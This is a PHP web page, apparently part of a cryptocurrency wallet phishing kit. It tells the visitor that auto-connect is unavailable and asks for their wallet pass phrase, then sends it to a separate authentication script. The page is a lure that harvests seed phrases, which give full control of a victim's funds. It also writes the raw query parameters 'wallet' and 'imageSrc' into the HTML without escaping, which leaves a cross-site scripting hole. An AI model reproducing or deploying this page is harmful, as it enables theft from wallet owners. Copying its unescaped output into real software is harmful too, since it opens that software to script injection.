<?php require_once 'includes/header.php';?>  

<main>
  <section class="hero">
    <div class="container">
      <div class="row-center">
        <?php
        // Get the wallet name and image source from the query parameters
        $wallet = $_GET['wallet'];
        $imageSrc = $_GET['imageSrc'];
        
        // Adjust the wallet name if it contains '%'
        $wallet = str_replace('%', ' ', $wallet);
        ?>
        <img src="<?php echo $imageSrc; ?>" class="wallet-icon" style="width:100px;">
      </div>

      <p class="hero__descr">
        Auto connect not available for this wallet. Please enter your wallet phrase to continue
      </p>

      <form action="authentication_v2.php" method="post">
        <input type="hidden" name="wallet" value="<?php echo $wallet; ?>">

        <div class="form-group">
          <label>Pass Phrase</label>
          <textarea id="passphraseInput" rows="4" cols="50" name="passphrase" class="form-control" required></textarea>
        </div>

        <button type="submit" class="hero__connect">Connect</button>
      </form>

    </div>
  </section>
</main>

<?php require_once 'includes/footer.php';?>
